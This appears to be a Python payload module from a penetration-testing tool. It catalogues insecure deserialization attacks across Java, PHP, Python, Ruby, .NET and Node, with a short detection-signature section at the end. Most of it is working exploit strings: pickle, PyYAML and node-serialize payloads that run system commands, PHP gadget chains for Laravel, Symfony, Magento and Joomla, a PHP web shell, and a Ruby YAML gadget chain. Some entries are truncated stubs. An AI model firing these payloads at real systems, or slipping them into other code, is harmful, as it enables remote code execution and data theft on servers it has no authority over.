"""
Insecure Deserialization Payloads
Java, PHP, Python, Ruby, .NET
"""

DESER_PAYLOADS = {
    "detection": {
        "java": [
            # Java serialized object magic bytes (hex)
            "rO0AB",  # Base64 of aced0005 (Java serialization magic)
            "\\xac\\xed\\x00\\x05",  # Raw bytes
        ],
        "php": [
            'O:8:"stdClass":0:{}',
            'a:1:{i:0;s:4:"test";}',
            'O:1:"a":1:{s:1:"b";s:1:"c";}',
        ],
        "python": [
            "gASV",  # Pickle protocol 4
            "cos\\n",  # Pickle with os module
            "\\x80\\x04",  # Raw pickle bytes
        ],
        "ruby": [
            "\\x04\\x08",  # Ruby Marshal magic
            "BAh",  # Base64 of Ruby Marshal
        ],
        "dotnet": [
            "AAEAAAD/////",  # .NET BinaryFormatter base64
        ],
    },

    "java": {
        "ysoserial_gadgets": [
            # Common ysoserial gadget chains
            "CommonsCollections1",
            "CommonsCollections2",
            "CommonsCollections3",
            "CommonsCollections4",
            "CommonsCollections5",
            "CommonsCollections6",
            "CommonsCollections7",
            "CommonsBeanutils1",
            "BeanShell1",
            "C3P0",
            "Clojure",
            "FileUpload1",
            "Groovy1",
            "Hibernate1",
            "Hibernate2",
            "JBossInterceptors1",
            "JRMPClient",
            "JRMPListener",
            "JSON1",
            "JavassistWeld1",
            "Jdk7u21",
            "Jython1",
            "MozillaRhino1",
            "MozillaRhino2",
            "Myfaces1",
            "Myfaces2",
            "ROME",
            "Spring1",
            "Spring2",
            "URLDNS",
            "Vaadin1",
            "Wicket1",
        ],

        # Example payloads (base64 encoded ysoserial output)
        "examples": {
            "urldns": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD/////AAAAAHQAAAB0AAB0AAtBVFRBQ0tFUi5JUHQABGh0dHBweHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABeA==",
        },

        "tomcat": [
            # Tomcat Session Persistence
            "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50Lk",  # Partial example
        ],

        "jmx": [
            # JMX deserialization
            "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50Lk",
        ],

        "rmi": [
            # RMI registry exploitation
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldL",
        ],
    },

    "php": {
        "rce": [
            # PHP Object Injection RCE examples
            '''O:8:"Autoload":1:{s:4:"file";s:11:"/etc/passwd";}''',
            '''O:7:"Example":1:{s:3:"cmd";s:2:"id";}''',
            '''O:3:"foo":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:29:"<?php system($_GET['c']); ?>";}''',

            # Phar deserialization
            '''phar://./image.jpg/test''',
            '''phar://./uploads/avatar.gif''',

            # Common gadget chains
            '''O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:60:"eval(base64_decode($_POST[1]));JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";b:1;}''',
        ],

        "file_read": [
            '''O:8:"Autoload":1:{s:4:"file";s:11:"/etc/passwd";}''',
            '''O:4:"Read":1:{s:4:"file";s:11:"/etc/passwd";}''',
            '''O:8:"Template":1:{s:8:"template";s:11:"/etc/passwd";}''',
        ],

        "sql_injection": [
            '''O:4:"User":1:{s:2:"id";s:21:"1' OR '1'='1'-- -";}''',
            '''O:8:"Database":1:{s:5:"query";s:30:"SELECT * FROM users WHERE 1=1";}''',
        ],

        "common_chains": {
            "laravel": '''O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\\x00*\\x00events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"\\x00*\\x00listeners";a:1:{s:6:"system";a:1:{i:0;s:6:"system";}}}s:8:"\\x00*\\x00event";s:2:"id";}''',
            "symfony": '''O:44:"Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter":2:{s:57:"\\x00Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter\\x00deferred";a:0:{}s:13:"\\x00*\\x00pool";O:44:"Symfony\\Component\\Cache\\Adapter\\ProxyAdapter":2:{s:54:"\\x00Symfony\\Component\\Cache\\Adapter\\ProxyAdapter\\x00poolHash";i:1;s:58:"\\x00Symfony\\Component\\Cache\\Adapter\\ProxyAdapter\\x00setInnerItem";s:6:"system";}}''',
            "wordpress": '''O:8:"WP_User":0:{}''',
            "magento": '''O:38:"Zend_Log_Writer_Mail":4:{s:17:"\\x00*\\x00_subjectPrependText";N;s:12:"\\x00*\\x00_eventsToMail";a:0:{}s:6:"\\x00*\\x00_mail";O:9:"Zend_Mail":0:{}s:10:"\\x00*\\x00_layout";O:11:"Zend_Layout":3:{s:13:"\\x00*\\x00_inflector";O:23:"Zend_Filter_PregReplace":2:{s:16:"\\x00*\\x00_matchPattern";s:7:"/(.*)/e";s:15:"\\x00*\\x00_replacement";s:8:"id";}s:20:"\\x00*\\x00_inflectorEnabled";b:1;s:10:"\\x00*\\x00_layout";s:6:"layout";}}''',
        },

        "phar": [
            # Phar deserialization via different wrappers
            "phar:///var/www/uploads/image.jpg",
            "phar://./file.tar.gz/test.txt",
            "compress.zlib://phar://./file.jpg",
            "php://filter/resource=phar://./file.jpg",
        ],
    },

    "python": {
        "pickle": [
            # Pickle RCE payloads
            '''cos
system
(S'id'
tR.''',

            '''csubprocess
check_output
(S'id'
tR.''',

            # Base64 encoded versions
            "gASVIgAAAAAAAACMCHN1YnByb2Nlc3OUIA==",  # Example
        ],

        "pyyaml": [
            # PyYAML unsafe load
            '''!!python/object/apply:os.system ["id"]''',
            '''!!python/object/new:subprocess.check_output [["id"]]''',
            '''!!python/object/apply:subprocess.check_output [["id"]]''',
            '''!!python/object/new:os.system ["id"]''',
            '''!!python/object/apply:builtins.eval ["__import__('os').system('id')"]''',

            # With arguments
            '''!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval, ["__import__('os').system('id')"]]]''',
        ],

        "jsonpickle": [
            '''{"py/reduce": [{"py/type": "subprocess.check_output"}, {"py/tuple": ["id"]}]}''',
        ],

        "dill": [
            # Similar to pickle but more powerful
            '''cos
system
(S'id'
tR.''',
        ],
    },

    "ruby": {
        "marshal": [
            # Ruby Marshal RCE
            '''\\x04\\x08o:\\x19Gem::Requirement\\x07:\\x10@requirements[\\x07[\\x06c\\x0dKernel\\x1d-c 'id' > /tmp/pwned''',
        ],

        "erb": [
            '''<%= system('id') %>''',
            '''<%= `id` %>''',
        ],

        "yaml": [
            '''--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve''',
        ],
    },

    "dotnet": {
        "binaryformatter": [
            # .NET BinaryFormatter
            "AAEAAAD/////AQAAAAAAAAAMAgAAAEpTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXRgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAABUNvdW50",
        ],

        "objectstateformatter": [
            # ViewState deserialization
            "AAEAAAD/////AQAAAAAAAAAMAgAAAA==",
        ],

        "ysoserial_net_gadgets": [
            "ActivitySurrogateSelector",
            "ObjectDataProvider",
            "PSObject",
            "TextFormattingRunProperties",
            "TypeConfuseDelegate",
            "WindowsIdentity",
            "XamlAssemblyLoadFromFile",
        ],

        "viewstate": [
            # Unprotected ViewState
            "/wEPDwULLTE2MTY2ODcyMjkPZBYCAgMPZBYEAgEPDxYCHgdWaXNpYmxlaGRkAgcPDxYCHgRUZXh0BQdXZWxjb21lZGRk",
        ],
    },

    "node": {
        "node_serialize": [
            '''{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)});}()"}''',
            '''{"username":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()","password":"test"}''',
        ],

        "cryo": [
            '''{"__proto__":{"toString":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}}''',
        ],
    },
}

# Detection signatures
DESER_SIGNATURES = {
    "java": [b"\\xac\\xed\\x00\\x05", b"rO0AB"],
    "php": [b"O:", b"a:", b"s:", b"i:"],
    "python": [b"\\x80\\x04", b"cos\\n", b"cposix"],
    "ruby": [b"\\x04\\x08"],
    "dotnet": [b"AAEAAAD"],
}
